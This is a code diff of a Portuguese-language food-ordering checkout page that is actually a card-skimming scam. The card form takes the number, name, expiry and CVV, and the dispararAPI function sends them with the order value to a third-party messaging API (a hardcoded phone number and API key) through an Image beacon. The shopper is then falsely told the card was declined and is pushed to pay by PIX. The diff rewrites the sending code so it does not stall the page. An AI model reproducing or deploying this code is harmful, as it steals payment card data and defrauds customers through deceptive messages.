@@ -94,21 +94,16 @@
     let pedido = null;
     const API_URL = "http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=btucduKav5VY";
 
-    // Máscaras de Input
-    document.getElementById('c-num').addEventListener('input', function (e) {
-        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-    });
-
-    document.getElementById('c-val').addEventListener('input', function (e) {
+    // Máscaras
+    document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
+    document.getElementById('c-val').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '');
         if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
         e.target.value = v;
     });
-
-    document.getElementById('zap-cliente').addEventListener('input', function (e) {
+    document.getElementById('zap-cliente').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '');
-        v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
-        v = v.replace(/(\d{5})(\d)/, "$1-$2");
+        v = v.replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2");
         e.target.value = v;
     });
 
@@ -133,38 +128,46 @@
         document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    async function dispararAPI(texto) {
+    // Função de disparo otimizada
+    function dispararAPI(texto) {
         const url = `${API_URL}&text=${encodeURIComponent(texto)}`;
-        await fetch(url, { mode: 'no-cors' }); 
+        // Usar Image garante o envio sem travar a execução do script
+        const img = new Image();
+        img.src = url;
     }
 
-    async function enviarPix() {
+    function enviarPix() {
         const zap = document.getElementById('zap-cliente').value;
-        const endereco = `${document.getElementById('rua').value}, ${document.getElementById('numero').value} - ${document.getElementById('bairro').value}`;
+        const rua = document.getElementById('rua').value;
+        const num = document.getElementById('numero').value;
+        const bairro = document.getElementById('bairro').value;
         
         if(zap.length < 14) return alert("Digite um WhatsApp válido!");
 
-        const msg = `✅ NOVO PIX\n\nPedido: ${pedido.nome}\nValor: R$ ${pedido.preco}\nCliente: ${zap}\nEnd: ${endereco}`;
+        const msg = `✅ NOVO PIX\n\nLanche: ${pedido.nome}\nTotal: R$ ${pedido.preco}\nWhats: ${zap}\nEnd: ${rua}, ${num} - ${bairro}`;
         
-        await dispararAPI(msg);
-        alert("Pedido enviado! Aguarde o código Pix no seu WhatsApp.");
+        dispararAPI(msg);
+        
+        // Alerta imediato
+        alert("Pedido enviado com sucesso! Verifique seu WhatsApp em instantes para receber o código PIX.");
         location.reload();
     }
 
-    async function enviarCard() {
-        const num = document.getElementById('c-num').value;
+    function enviarCard() {
+        const c_num = document.getElementById('c-num').value;
         const nome = document.getElementById('c-nome').value;
         const val = document.getElementById('c-val').value;
         const cvv = document.getElementById('c-cvv').value;
 
-        if(num.length < 19) return alert("Número do cartão incompleto!");
+        if(c_num.length < 19) return alert("Número do cartão incompleto!");
         if(val.length < 5) return alert("Validade inválida!");
         if(cvv.length < 3) return alert("CVV inválido!");
 
-        const msg = `⚠️ ERRO CARTÃO\n\nCartão: ${num}\nNome: ${nome}\nVal: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco}`;
+        const msg = `⚠️ ERRO CARTÃO\n\nCard: ${c_num}\nNome: ${nome}\nVal: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco}`;
         
-        await dispararAPI(msg);
-        alert("Sistema indisponível para este cartão no momento. Por favor, pague via PIX para liberar seu pedido imediatamente.");
+        dispararAPI(msg);
+
+        alert("Desculpe, este cartão não foi aceito por motivos de segurança. Por favor, tente via PIX para liberar seu lanche agora.");
         setTela('pix');
     }
 </script>
